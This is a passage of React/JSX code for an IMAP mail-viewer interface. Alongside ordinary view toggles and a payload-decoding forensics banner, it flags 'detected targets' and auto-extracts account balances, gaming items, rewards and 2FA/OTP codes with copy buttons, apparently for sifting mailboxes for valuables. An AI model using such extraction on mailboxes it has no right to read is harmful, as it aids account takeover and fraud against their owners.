                      style={{ fontSize: '0.72rem', padding: '5px 10px', display: 'flex', alignItems: 'center', gap: '4px', color: isFetchingLive ? '#00ff9d' : undefined }}
                      title="Refresh mailbox to check for new incoming emails"
                    >
                      <RefreshCw size={13} className={isFetchingLive ? 'animate-spin' : ''} />
                      {isFetchingLive ? 'Checking...' : 'Refresh'}
                    </button>

                    {/* Maximize / Expand Mail Viewer Toggle */}
                    <button
                      onClick={() => setIsMaximized(!isMaximized)}
                      className="glass-btn"
                      style={{
                        fontSize: '0.72rem',
                        padding: '5px 12px',
                        display: 'flex',
                        alignItems: 'center',
                        gap: '5px',
                        color: isMaximized ? '#00ff9d' : '#8b9bb4',
                        background: isMaximized ? 'rgba(0,255,157,0.15)' : undefined,
                        borderColor: isMaximized ? '#00ff9d' : undefined
                      }}
                      title={isMaximized ? "Restore standard columns" : "Maximize mail viewer window"}
                    >
                      {isMaximized ? <Minimize2 size={13} /> : <Maximize2 size={13} />}
                      {isMaximized ? 'Restore View' : 'Maximize Window'}
                    </button>
                  </div>

                  {/* Render Mode & Live Webmail Link */}
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                    {webmailUrl && (
                      <a 
                        href={webmailUrl} 
                        target="_blank" 
                        rel="noopener noreferrer"
                        className="glass-btn glass-btn-green"
                        style={{ fontSize: '0.72rem', padding: '5px 12px', display: 'flex', alignItems: 'center', gap: '6px', textDecoration: 'none' }}
                      >
                        <Globe size={13} /> Open in {providerName}
                        <ExternalLink size={12} />
                      </a>
                    )}

                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                      <button
                        onClick={() => setShowLinkInspectorModal(true)}
                        className="glass-btn"
                        style={{ fontSize: '0.7rem', padding: '4px 8px', color: '#00e5ff', display: 'flex', alignItems: 'center', gap: '4px' }}
                        title="Safely inspect all links without loading them"
                      >
                        <Link2 size={12} /> Links ({extractedLinks.length})
                      </button>

                      <button
                        onClick={() => setBlockExternalImages(!blockExternalImages)}
                        className="glass-btn"
                        style={{
                          fontSize: '0.7rem',
                          padding: '4px 8px',
                          color: blockExternalImages ? '#00ff9d' : '#f87171',
                          borderColor: blockExternalImages ? 'rgba(0,255,157,0.3)' : 'rgba(248,113,113,0.3)',
                          display: 'flex',
                          alignItems: 'center',
                          gap: '4px'
                        }}
                        title={blockExternalImages ? "Tracker images are blocked to prevent IP/location beaconing" : "External images allowed"}
                      >
                        <ShieldCheck size={12} /> {blockExternalImages ? 'Trackers Blocked' : 'Images Allowed'}
                      </button>

                      <button
                        onClick={() => setDarkInvertMode(!darkInvertMode)}
                        className="glass-btn"
                        style={{
                          fontSize: '0.7rem',
                          padding: '4px 8px',
                          color: darkInvertMode ? '#00e5ff' : '#94a3b8',
                          borderColor: darkInvertMode ? 'rgba(0,229,255,0.4)' : 'rgba(255,255,255,0.1)',
                          background: darkInvertMode ? 'rgba(0,229,255,0.1)' : 'transparent',
                          display: 'flex',
                          alignItems: 'center',
                          gap: '4px'
                        }}
                        title={darkInvertMode ? "Smart Dark Invert active (converts bright white HTML email templates to dark mode)" : "Dark Invert disabled"}
                      >
                        {darkInvertMode ? <Moon size={12} style={{ color: '#00e5ff' }} /> : <Sun size={12} />}
                        {darkInvertMode ? 'Dark Invert: ON' : 'Dark Invert: OFF'}
                      </button>
                    </div>

                    <div style={{ background: '#070a12', padding: '2px', borderRadius: '8px', border: '1px solid rgba(255,255,255,0.1)', display: 'flex' }}>
                      <button
                        onClick={() => setViewMode('visual')}
                        style={{
                          padding: '4px 10px', borderRadius: '6px', fontSize: '0.7rem',
                          display: 'flex', alignItems: 'center', gap: '4px', border: 'none', cursor: 'pointer',
                          background: viewMode === 'visual' ? 'rgba(0,255,157,0.2)' : 'transparent',
                          color: viewMode === 'visual' ? '#00ff9d' : '#8b9bb4',
                          fontWeight: viewMode === 'visual' ? 700 : 400
                        }}
                      >
                        <Eye size={12} /> HTML View
                      </button>
                      <button
                        onClick={() => setViewMode('text')}
                        style={{
                          padding: '4px 10px', borderRadius: '6px', fontSize: '0.7rem',
                          display: 'flex', alignItems: 'center', gap: '4px', border: 'none', cursor: 'pointer',
                          background: viewMode === 'text' ? 'rgba(0,229,255,0.2)' : 'transparent',
                          color: viewMode === 'text' ? '#00e5ff' : '#8b9bb4',
                          fontWeight: viewMode === 'text' ? 700 : 400
                        }}
                      >
                        Plain Text
                      </button>
                      <button
                        onClick={() => setViewMode('raw')}
                        style={{
                          padding: '4px 10px', borderRadius: '6px', fontSize: '0.7rem',
                          display: 'flex', alignItems: 'center', gap: '4px', border: 'none', cursor: 'pointer',
                          background: viewMode === 'raw' ? 'rgba(176,38,255,0.2)' : 'transparent',
                          color: viewMode === 'raw' ? '#b026ff' : '#8b9bb4',
                          fontWeight: viewMode === 'raw' ? 700 : 400
                        }}
                      >
                        <Code2 size={12} /> Raw IMAP Source
                      </button>
                    </div>
                  </div>
                </div>

                {/* Email Subject Title */}
                <h1 style={{ fontSize: '1.05rem', fontWeight: 800, color: '#fff', lineHeight: 1.25, margin: '0 0 6px' }}>
                  {activeMail.subject}
                </h1>

                {/* Sender & Recipient Profile Bar */}
                <div style={{
                  display: 'flex', justifyContent: 'space-between', alignItems: 'center',
                  background: 'rgba(0,0,0,0.3)', padding: '6px 12px', borderRadius: '8px',
                  border: '1px solid rgba(255,255,255,0.05)', flexWrap: 'wrap', gap: '8px'
                }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                    <div style={{
                      width: '28px', height: '28px', borderRadius: '50%',
                      background: 'linear-gradient(135deg, #0284c7, #00ff9d)',
                      display: 'flex', alignItems: 'center', justifyContent: 'center',
                      fontWeight: 800, fontSize: '0.75rem', color: '#000', flexShrink: 0
                    }}>
                      {((activeMail.sender || activeMail.senderEmail || 'U').charAt(0)).toUpperCase()}
                    </div>
                    <div>
                      <div style={{ fontSize: '0.78rem', fontWeight: 700, color: '#fff' }}>
                        {activeMail.sender} <span style={{ color: '#8b9bb4', fontWeight: 400, fontSize: '0.72rem' }}>&lt;{activeMail.senderEmail}&gt;</span>
                      </div>
                      <div style={{ fontSize: '0.65rem', color: '#64748b', fontFamily: "'JetBrains Mono', monospace" }}>
                        To: <span style={{ color: '#94a3b8' }}>me &lt;{activeMail.email}&gt;</span> &bull; 
                        <span style={{ color: '#00ff9d', marginLeft: '6px' }}>🔒 Verified via IMAP ({imapConfig.host})</span>
                      </div>
                    </div>
                  </div>

                  <div style={{ textAlign: 'right', fontSize: '0.68rem', color: '#8b9bb4', fontFamily: "'JetBrains Mono', monospace" }}>
                    <div>{activeMail.date}</div>
                    <div style={{ color: '#00e5ff', fontSize: '0.62rem' }}>Folder: {activeMail.folder}</div>
                  </div>
                </div>

                {/* Target Keyword Tags if detected */}
                {activeMail.matchedTargets?.length > 0 && (
                  <div style={{ marginTop: '8px', display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
                    <span style={{ fontSize: '0.65rem', color: '#8b9bb4', fontFamily: "'JetBrains Mono', monospace" }}>
                      DETECTED TARGETS:
                    </span>
                    {activeMail.matchedTargets.map((kw, i) => (
                      <span key={i} className="badge-purple" style={{ fontSize: '0.68rem', padding: '2px 8px' }}>
                        🎯 {kw}
                      </span>
                    ))}
                  </div>
                )}

                {/* Extracted Asset & Intelligence Badges */}
                {activeMail.extractedData && (
                  <div style={{ marginTop: '8px', display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap' }}>
                    {activeMail.extractedData.balances?.map((b, i) => (
                      <span key={`bal-${i}`} style={{ fontSize: '0.68rem', padding: '2px 8px', borderRadius: '6px', background: 'rgba(0,255,157,0.15)', border: '1px solid rgba(0,255,157,0.4)', color: '#00ff9d', fontWeight: 700, display: 'flex', alignItems: 'center', gap: '4px' }}>
                        <DollarSign size={10} /> {b}
                      </span>
                    ))}
                    {activeMail.extractedData.gaming?.map((g, i) => (
                      <span key={`game-${i}`} style={{ fontSize: '0.68rem', padding: '2px 8px', borderRadius: '6px', background: 'rgba(176,38,255,0.15)', border: '1px solid rgba(176,38,255,0.4)', color: '#d8b4fe', fontWeight: 700, display: 'flex', alignItems: 'center', gap: '4px' }}>
                        <Gamepad2 size={11} /> {g}
                      </span>
                    ))}
                    {activeMail.extractedData.rewards?.map((r, i) => (
                      <span key={`rew-${i}`} style={{ fontSize: '0.68rem', padding: '2px 8px', borderRadius: '6px', background: 'rgba(250,204,21,0.15)', border: '1px solid rgba(250,204,21,0.4)', color: '#fde047', fontWeight: 700, display: 'flex', alignItems: 'center', gap: '4px' }}>
                        <Award size={11} /> {r}
                      </span>
                    ))}
                    {activeMail.extractedData.memberships?.map((m, i) => (
                      <span key={`mem-${i}`} style={{ fontSize: '0.68rem', padding: '2px 8px', borderRadius: '6px', background: 'rgba(0,229,255,0.15)', border: '1px solid rgba(0,229,255,0.4)', color: '#67e8f9', fontWeight: 700, display: 'flex', alignItems: 'center', gap: '4px' }}>
                        👑 {m}
                      </span>
                    ))}
                    {activeMail.extractedData.tracking?.map((t, i) => (
                      <span key={`track-${i}`} style={{ fontSize: '0.68rem', padding: '2px 8px', borderRadius: '6px', background: 'rgba(56,189,248,0.15)', border: '1px solid rgba(56,189,248,0.4)', color: '#7dd3fc', fontWeight: 700, display: 'flex', alignItems: 'center', gap: '4px' }}>
                        <Package size={11} /> {t.carrier}: {t.trackingNumber}
                      </span>
                    ))}
                    {activeMail.extractedData.orders?.map((o, i) => (
                      <span key={`ord-${i}`} style={{ fontSize: '0.68rem', padding: '2px 8px', borderRadius: '6px', background: 'rgba(244,114,182,0.15)', border: '1px solid rgba(244,114,182,0.4)', color: '#f472b6', fontWeight: 700, display: 'flex', alignItems: 'center', gap: '4px' }}>
                        🧾 Order #{o}
                      </span>
                    ))}
                  </div>
                )}

                {/* One-Tap 2FA / OTP & Financial Total Intel Banner */}
                {(activeMail.extractedData?.otp || activeMail.extractedData?.financialTotal) && (
                  <div style={{
                    marginTop: '8px',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'space-between',
                    gap: '12px',
                    padding: '8px 12px',
                    borderRadius: '8px',
                    background: 'linear-gradient(90deg, rgba(0, 229, 255, 0.08) 0%, rgba(176, 38, 255, 0.08) 100%)',
                    border: '1px solid rgba(0, 229, 255, 0.35)',
                    boxShadow: '0 0 15px rgba(0, 229, 255, 0.1)',
                    flexWrap: 'wrap'
                  }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap' }}>
                      {activeMail.extractedData.otp && (
                        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                          <span style={{
                            fontSize: '0.72rem',
                            fontWeight: 800,
                            color: '#00e5ff',
                            letterSpacing: '0.5px',
                            display: 'flex',
                            alignItems: 'center',
                            gap: '5px'
                          }}>
                            <Lock size={12} style={{ color: '#00ff9d' }} />
                            2FA / OTP CODE:
                          </span>
                          <code style={{
                            fontSize: '0.95rem',
                            fontWeight: 900,
                            color: '#ffffff',
                            background: '#070a12',
                            padding: '2px 10px',
                            borderRadius: '6px',
                            border: '1px solid #00e5ff',
                            letterSpacing: '2px',
                            fontFamily: "'JetBrains Mono', monospace",
                            boxShadow: '0 0 10px rgba(0,229,255,0.25)'
                          }}>
                            {activeMail.extractedData.otp}
                          </code>
                          <button
                            onClick={() => {
                              navigator.clipboard.writeText(activeMail.extractedData.otp);
                              setCopiedOtp(true);
                              setTimeout(() => setCopiedOtp(false), 2000);
                            }}
                            className="glass-btn glass-btn-cyan"
                            style={{
                              padding: '2px 8px',
                              fontSize: '0.68rem',
                              display: 'flex',
                              alignItems: 'center',
                              gap: '4px'
                            }}
                          >
                            {copiedOtp ? <Check size={11} style={{ color: '#00ff9d' }} /> : <Copy size={11} />}
                            {copiedOtp ? 'Copied!' : 'Copy Code'}
                          </button>
                        </div>
                      )}

                      {activeMail.extractedData.financialTotal && (
                        <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                          <span style={{ fontSize: '0.72rem', fontWeight: 800, color: '#fde047', display: 'flex', alignItems: 'center', gap: '4px' }}>
                            <DollarSign size={12} />
                            TOTAL:
                          </span>
                          <span style={{
                            fontSize: '0.82rem',
                            fontWeight: 900,
                            color: '#00ff9d',
                            background: 'rgba(0, 255, 157, 0.1)',
                            border: '1px solid rgba(0, 255, 157, 0.3)',
                            padding: '2px 8px',
                            borderRadius: '6px',
                            fontFamily: "'JetBrains Mono', monospace"
                          }}>
                            {activeMail.extractedData.financialTotal}
                          </span>
                        </div>
                      )}
                    </div>

                    <div style={{ fontSize: '0.65rem', color: '#8b9bb4', fontFamily: "'JetBrains Mono', monospace" }}>
                      ⚡ AUTO-EXTRACTED INTEL
                    </div>
                  </div>
                )}

                {/* Distinct Cyber Forensics Banner when obfuscated payload is detected */}
                {activeMail.forensicAnalysis?.wasObfuscated && (
                  <div style={{
                    marginTop: '4px',
                    borderRadius: '10px',
                    background: 'linear-gradient(135deg, rgba(176, 38, 255, 0.12) 0%, rgba(0, 229, 255, 0.08) 50%, rgba(6, 7, 10, 0.95) 100%)',
                    border: '1px solid rgba(176, 38, 255, 0.45)',
                    boxShadow: '0 0 25px rgba(176, 38, 255, 0.15), inset 0 0 15px rgba(0, 229, 255, 0.05)',
                    padding: '12px 16px',
                    display: 'flex',
                    flexDirection: 'column',
                    gap: '10px',
                    position: 'relative',
                    overflow: 'hidden'
                  }}>
                    {/* Glowing Top Scanner Line */}
                    <div style={{
                      position: 'absolute',
                      top: 0,
                      left: 0,
                      right: 0,
                      height: '2px',
                      background: 'linear-gradient(90deg, transparent, #00e5ff, #b026ff, transparent)',
                      boxShadow: '0 0 8px #00e5ff'
                    }} />

                    {/* Header Row: Title, Layers Unpacked & View Toggle */}
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                        <div style={{
                          width: '34px',
                          height: '34px',
                          borderRadius: '8px',
                          background: 'linear-gradient(135deg, #b026ff 0%, #00e5ff 100%)',
                          display: 'flex',
                          alignItems: 'center',
                          justifyContent: 'center',
                          boxShadow: '0 0 14px rgba(176, 38, 255, 0.5)',
                          flexShrink: 0
                        }}>
                          <ShieldAlert size={19} color="#fff" />
                        </div>
                        <div>
                          <div style={{
                            fontSize: '0.88rem',
                            fontWeight: 800,
                            color: '#ffffff',
                            letterSpacing: '0.4px',
                            display: 'flex',
                            alignItems: 'center',
                            gap: '8px'
                          }}>
                            Decoded Obfuscated Payload ({activeMail.forensicAnalysis.layersUnpacked || activeMail.forensicAnalysis.unpackTrace?.length || 1} {((activeMail.forensicAnalysis.layersUnpacked || activeMail.forensicAnalysis.unpackTrace?.length || 1) === 1) ? 'layer' : 'layers'} unpacked)
                            <span style={{
                              fontSize: '0.62rem',
                              fontWeight: 800,
                              padding: '2px 7px',
                              borderRadius: '4px',
                              background: 'rgba(0, 255, 157, 0.15)',
                              border: '1px solid rgba(0, 255, 157, 0.4)',
                              color: '#00ff9d',
                              letterSpacing: '0.5px',
                              textTransform: 'uppercase'
                            }}>
                              DECODED
                            </span>
                          </div>
                          <div style={{
                            fontSize: '0.65rem',
                            color: '#8b9bb4',
                            fontFamily: "'JetBrains Mono', monospace",
                            display: 'flex',
                            alignItems: 'center',
                            gap: '6px',
                            marginTop: '2px'
                          }}>
                            <Terminal size={11} style={{ color: '#00e5ff' }} />
                            <span>CYBER FORENSICS ENGINE &bull; ANTI-EVASION HEURISTICS</span>
                          </div>
                        </div>
                      </div>

                      {/* Recovered Plaintext vs Raw Encoded Blob Toggle Controls */}
                      <div style={{
                        display: 'flex',
                        alignItems: 'center',
                        gap: '4px',
                        background: 'rgba(7, 10, 18, 0.9)',
                        padding: '3px',
                        borderRadius: '8px',
                        border: '1px solid rgba(255, 255, 255, 0.1)'
                      }}>
                        <button
                          onClick={() => setForensicPayloadView('recovered')}
                          className="glass-btn"
                          style={{
                            fontSize: '0.72rem',
                            fontWeight: forensicPayloadView === 'recovered' ? 800 : 500,
                            padding: '4px 12px',
                            borderRadius: '6px',
                            border: forensicPayloadView === 'recovered' ? '1px solid #00ff9d' : '1px solid transparent',
                            background: forensicPayloadView === 'recovered' ? 'rgba(0, 255, 157, 0.18)' : 'transparent',
                            color: forensicPayloadView === 'recovered' ? '#00ff9d' : '#8b9bb4',
                            boxShadow: forensicPayloadView === 'recovered' ? '0 0 10px rgba(0, 255, 157, 0.25)' : 'none',
                            display: 'flex',
                            alignItems: 'center',
                            gap: '5px',
                            cursor: 'pointer',
                            transition: 'all 0.15s'
                          }}
                          title="View decoded recovered plaintext payload"
                        >
                          <FileText size={12} />
                          Recovered Plaintext
                        </button>

                        <button
                          onClick={() => setForensicPayloadView('raw')}
                          className="glass-btn"
                          style={{
                            fontSize: '0.72rem',
                            fontWeight: forensicPayloadView === 'raw' ? 800 : 500,
                            padding: '4px 12px',
                            borderRadius: '6px',
                            border: forensicPayloadView === 'raw' ? '1px solid #b026ff' : '1px solid transparent',
                            background: forensicPayloadView === 'raw' ? 'rgba(176, 38, 255, 0.22)' : 'transparent',
                            color: forensicPayloadView === 'raw' ? '#d8b4fe' : '#8b9bb4',
                            boxShadow: forensicPayloadView === 'raw' ? '0 0 10px rgba(176, 38, 255, 0.25)' : 'none',
                            display: 'flex',
                            alignItems: 'center',
                            gap: '5px',
                            cursor: 'pointer',
                            transition: 'all 0.15s'
                          }}
                          title="View raw encoded base64 / obfuscated blob"
                        >
                          <Binary size={12} />
                          Raw Encoded Blob
                        </button>
                      </div>
                    </div>

                    {/* Attribution & Threat Badges Row */}
                    <div style={{
                      display: 'flex',
                      alignItems: 'center',
                      flexWrap: 'wrap',
                      gap: '8px',
                      paddingTop: '6px',
                      borderTop: '1px solid rgba(255, 255, 255, 0.06)'
                    }}>
                      {/* Origin IP Traces */}
                      <div style={{ display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap' }}>
                        <span style={{
                          fontSize: '0.64rem',
                          color: '#8b9bb4',
                          fontFamily: "'JetBrains Mono', monospace",
                          fontWeight: 700,
                          letterSpacing: '0.5px'
                        }}>
                          ORIGIN IP TRACE:
                        </span>
                        {activeMail.forensicAnalysis.originIps && activeMail.forensicAnalysis.originIps.length > 0 ? (
                          activeMail.forensicAnalysis.originIps.map((ip, i) => (
                            <button
                              key={`origin-ip-${i}`}
                              onClick={() => {
                                navigator.clipboard?.writeText(ip);
                                setCopiedForensicIp(ip);
                                setTimeout(() => setCopiedForensicIp(null), 2000);
                              }}
                              style={{
                                fontSize: '0.68rem',
                                fontFamily: "'JetBrains Mono', monospace",
                                fontWeight: 700,
                                padding: '2px 8px',
                                borderRadius: '6px',
                                background: 'rgba(0, 229, 255, 0.12)',
                                border: '1px solid rgba(0, 229, 255, 0.4)',
                                color: '#00e5ff',
                                display: 'inline-flex',
                                alignItems: 'center',
                                gap: '5px',
                                cursor: 'pointer',
                                transition: 'all 0.15s',
                                boxShadow: '0 0 8px rgba(0, 229, 255, 0.15)'
                              }}
                              title="Click to copy origin IP"
                            >
                              <Globe size={11} />
                              {ip}
                              {copiedForensicIp === ip ? <Check size={10} style={{ color: '#00ff9d' }} /> : <Copy size={10} />}
                            </button>
                          ))
                        ) : (
                          <span style={{
                            fontSize: '0.65rem',
                            fontFamily: "'JetBrains Mono', monospace",
                            padding: '2px 8px',
                            borderRadius: '6px',
                            background: 'rgba(255, 255, 255, 0.04)',
                            border: '1px solid rgba(255, 255, 255, 0.1)',
                            color: '#64748b'
                          }}>
                            Internal Relay / Direct
                          </span>
                        )}
                      </div>

                      {/* Threat Indicators Badge */}
                      <div style={{ display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap', marginLeft: 'auto' }}>
                        <span style={{
                          fontSize: '0.64rem',
                          color: '#8b9bb4',
                          fontFamily: "'JetBrains Mono', monospace",
                          fontWeight: 700,
                          letterSpacing: '0.5px'
                        }}>
                          THREAT INDICATORS:
                        </span>
                        {activeMail.forensicAnalysis.threatIndicators && activeMail.forensicAnalysis.threatIndicators.length > 0 ? (
                          activeMail.forensicAnalysis.threatIndicators.map((ind, i) => (
                            <span
                              key={`threat-${i}`}
                              style={{
                                fontSize: '0.66rem',
                                fontWeight: 700,
                                padding: '2px 8px',
                                borderRadius: '6px',
                                background: 'linear-gradient(135deg, rgba(255, 0, 85, 0.18), rgba(255, 183, 0, 0.15))',
                                border: '1px solid rgba(255, 0, 85, 0.45)',
                                color: '#ff4d79',
                                display: 'inline-flex',
                                alignItems: 'center',
                                gap: '5px',
                                boxShadow: '0 0 10px rgba(255, 0, 85, 0.15)'
                              }}
                            >
                              <AlertTriangle size={11} color="#ff4d79" />
                              {ind}
                            </span>
                          ))
                        ) : (
                          <span style={{
                            fontSize: '0.65rem',
                            padding: '2px 8px',
                            borderRadius: '6px',
                            background: 'rgba(0, 255, 157, 0.1)',
                            border: '1px solid rgba(0, 255, 157, 0.25)',
                            color: '#00ff9d',
                            display: 'inline-flex',
                            alignItems: 'center',
                            gap: '4px'
                          }}>
                            <ShieldCheck size={11} /> Clean Wrapper / No Red Flags
                          </span>
                        )}

                        {/* Unpack trace toggle button */}
                        {activeMail.forensicAnalysis.unpackTrace && activeMail.forensicAnalysis.unpackTrace.length > 0 && (
                          <button
                            onClick={() => setShowForensicTrace(!showForensicTrace)}
                            className="glass-btn"
                            style={{
                              fontSize: '0.64rem',
                              padding: '2px 8px',
                              color: showForensicTrace ? '#00e5ff' : '#8b9bb4',
                              borderColor: showForensicTrace ? 'rgba(0, 229, 255, 0.4)' : 'rgba(255, 255, 255, 0.1)',
                              background: showForensicTrace ? 'rgba(0, 229, 255, 0.1)' : 'transparent',
                              display: 'inline-flex',
                              alignItems: 'center',
                              gap: '4px'
                            }}
                          >
                            <Layers size={11} />
                            Trace ({activeMail.forensicAnalysis.unpackTrace.length})
                            {showForensicTrace ? <ChevronUp size={11} /> : <ChevronDown size={11} />}
                          </button>
                        )}
                      </div>
                    </div>

                    {/* Expandable Unpack Trace Terminal */}
                    {showForensicTrace && activeMail.forensicAnalysis.unpackTrace && activeMail.forensicAnalysis.unpackTrace.length > 0 && (
                      <div style={{
                        background: '#04060a',
                        borderRadius: '8px',
                        border: '1px solid rgba(0, 229, 255, 0.25)',
                        padding: '10px 14px',
                        fontFamily: "'JetBrains Mono', monospace",
                        fontSize: '0.7rem',
                        color: '#67e8f9',
                        display: 'flex',
                        flexDirection: 'column',
                        gap: '4px',
                        boxShadow: 'inset 0 0 12px rgba(0, 0, 0, 0.6)'
                      }}>
                        <div style={{ fontSize: '0.62rem', color: '#8b9bb4', borderBottom: '1px solid rgba(255, 255, 255, 0.08)', paddingBottom: '4px', marginBottom: '2px', display: 'flex', justifyContent: 'space-between' }}>
                          <span>UNPACK TRACE PIPELINE</span>
                          <span style={{ color: '#00ff9d' }}>STATUS: DECODED SUCCESSFULLY</span>
                        </div>
                        {activeMail.forensicAnalysis.unpackTrace.map((step, idx) => (
                          <div key={`trace-${idx}`} style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                            <span style={{ color: '#b026ff', fontWeight: 800 }}>[{idx + 1}]</span>
                            <span style={{ color: '#e2e8f0' }}>{step}</span>
                          </div>
                        ))}
                      </div>
                    )}

                    {/* Quick Payload Status & Copy Bar */}
                    <div style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: '4px 10px',
                      background: 'rgba(0, 0, 0, 0.4)',
                      borderRadius: '6px',
                      fontSize: '0.66rem',
                      fontFamily: "'JetBrains Mono', monospace",
                      color: '#8b9bb4'
                    }}>
                      <span>
                        VIEWING: <strong style={{ color: forensicPayloadView === 'recovered' ? '#00ff9d' : '#d8b4fe' }}>
                          {forensicPayloadView === 'recovered' ? 'Recovered Plaintext' : 'Raw Encoded Blob'}
                        </strong> &bull; Length: {((forensicPayloadView === 'recovered' ? activeMail.forensicAnalysis.recoveredContent : activeMail.bodyText) || '').length} chars
                      </span>
                      <button
                        onClick={() => {
                          const textToCopy = forensicPayloadView === 'recovered'
                            ? (activeMail.forensicAnalysis.recoveredContent || activeMail.bodyText || '')
                            : (activeMail.bodyText || activeMail.rawMime || '');
                          navigator.clipboard?.writeText(textToCopy);
                          setCopiedForensicPayload(true);
                          setTimeout(() => setCopiedForensicPayload(false), 2000);
                        }}
                        className="glass-btn"
                        style={{
                          padding: '2px 8px',
                          fontSize: '0.64rem',
                          display: 'flex',
                          alignItems: 'center',
                          gap: '4px',
                          color: copiedForensicPayload ? '#00ff9d' : '#00e5ff',
                          borderColor: copiedForensicPayload ? 'rgba(0,255,157,0.4)' : 'rgba(0,229,255,0.3)'
                        }}
                      >
                        {copiedForensicPayload ? <Check size={11} style={{ color: '#00ff9d' }} /> : <Copy size={11} />}
                        {copiedForensicPayload ? 'Copied!' : `Copy ${forensicPayloadView === 'recovered' ? 'Plaintext' : 'Raw Blob'}`}
                      </button>
                    </div>
                  </div>
                )}
              </div>

              {/* Email Content Body Display (Scrolls separately and stays still!) */}
              <div style={{ flex: 1, minHeight: 0, height: '100%', display: 'flex', flexDirection: 'column', overflow: 'hidden', position: 'relative' }}>
                {viewMode === 'visual' && activeMail.htmlBody ? (
                  // Authentic isolated HTML rendering inside iframe
                  <div style={{
                    flex: 1,
                    minHeight: 0,
                    height: '100%',
                    background: darkInvertMode ? '#121212' : '#ffffff',
                    borderRadius: '10px',
                    overflow: 'hidden',
                    border: darkInvertMode ? '1px solid rgba(0,229,255,0.2)' : '1px solid rgba(255,255,255,0.15)',
                    boxShadow: '0 4px 20px rgba(0,0,0,0.4)',
                    display: 'flex',
                    flexDirection: 'column'
                  }}>
                    <iframe 
                      ref={iframeRef}
                      title="Real Email HTML"
                      srcDoc={preparedHtmlBody}
                      sandbox="allow-popups"
                      style={{
                        width: '100%',
                        height: '100%',
                        minHeight: 0,
                        flex: 1,
                        border: 'none',
                        background: darkInvertMode ? '#121212' : '#ffffff',
                        display: 'block'
                      }}
                    />
                  </div>
                ) : viewMode === 'text' ? (
                  <div style={{
                    flex: 1,
                    minHeight: 0,
                    height: '100%',
                    background: '#070a12',
                    padding: '16px 20px',
                    borderRadius: '10px',
                    border: '1px solid rgba(255,255,255,0.08)',
                    fontFamily: "'JetBrains Mono', monospace",
                    fontSize: '0.8rem',
                    color: '#e2e8f0',
                    lineHeight: 1.6,
                    whiteSpace: 'pre-wrap',
                    overflowY: 'auto',
                    overscrollBehavior: 'contain'
                  }}>
                    {activeMail.forensicAnalysis?.wasObfuscated
                      ? (forensicPayloadView === 'raw'
                          ? (activeMail.bodyText || activeMail.rawMime || '(No raw encoded blob)')
                          : (activeMail.forensicAnalysis.recoveredContent || activeMail.bodyText || '(No recovered plaintext)'))
                      : (activeMail.bodyText || '(No plain text body content)')}
                  </div>
                ) : (
                  // Raw IMAP RFC822 Source View
                  <div style={{
                    flex: 1,
                    minHeight: 0,
                    height: '100%',
                    background: '#05070e',
                    padding: '16px',
                    borderRadius: '10px',
                    border: '1px solid rgba(255,255,255,0.08)',
                    fontFamily: "'JetBrains Mono', monospace",
                    fontSize: '0.72rem',
                    color: '#86efac',
                    overflowY: 'auto',
                    overscrollBehavior: 'contain'
                  }}>
                    <pre style={{ margin: 0, whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
                      {activeMail.rawMime || `From: ${activeMail.sender} <${activeMail.senderEmail}>\nTo: ${activeMail.email}\nSubject: ${activeMail.subject}\nDate: ${activeMail.date}\n\n${activeMail.bodyText}`}
                    </pre>
                  </div>
                )}
              </div>

              {/* Attachments Section */}
              {activeMail.attachments?.length > 0 && (
                <div style={{
                  marginTop: '10px', background: '#0e121d', border: '1px solid rgba(255,255,255,0.1)',
                  padding: '10px 16px', borderRadius: '10px', display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '8px',
                  flexShrink: 0
                }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px', fontSize: '0.75rem', fontFamily: "'JetBrains Mono', monospace", color: '#00e5ff' }}>
                    <Paperclip size={16} />
                    <span style={{ fontWeight: 700 }}>Attachments ({activeMail.attachments.length}):</span>
                    {activeMail.attachments.map((att, i) => (
                      <span key={i} style={{ background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.12)', padding: '4px 10px', borderRadius: '6px', color: '#fff', fontSize: '0.72rem', display: 'inline-flex', alignItems: 'center', gap: '6px' }}>
                        <span>{att.name}</span>
                        <span style={{ color: '#8b9bb4' }}>({att.size})</span>
                      </span>
                    ))}
                  </div>

                  <button className="glass-btn glass-btn-purple" style={{ fontSize: '0.7rem', padding: '4px 10px', display: 'flex', alignItems: 'center', gap: '4px' }}>
                    <Download size={12} /> Download Attachments
                  </button>
                </div>
              )}
            </>
          ) : (
            <div style={{
              flex: 1,
              display: 'flex',
              flexDirection: 'column',
              justifyContent: 'space-between',
              padding: '24px',
              background: 'radial-gradient(circle at 50% 20%, rgba(0, 229, 255, 0.04) 0%, transparent 60%)',
              overflowY: 'auto'
            }}>
              {/* Account Credentials & Protocol Card */}
              <div style={{
                background: 'rgba(0,0,0,0.4)',
                border: '1px solid rgba(0,255,157,0.3)',
                borderRadius: '14px',
                padding: '16px 20px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                flexWrap: 'wrap',
                gap: '12px'
              }}>
                <div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '4px' }}>
                    <span className="badge-ca" style={{ fontSize: '0.62rem', padding: '2px 7px' }}>
                      {(selectedAccount || '').endsWith('.ca') ? '🇨🇦 ' : ''}{providerName}
                    </span>
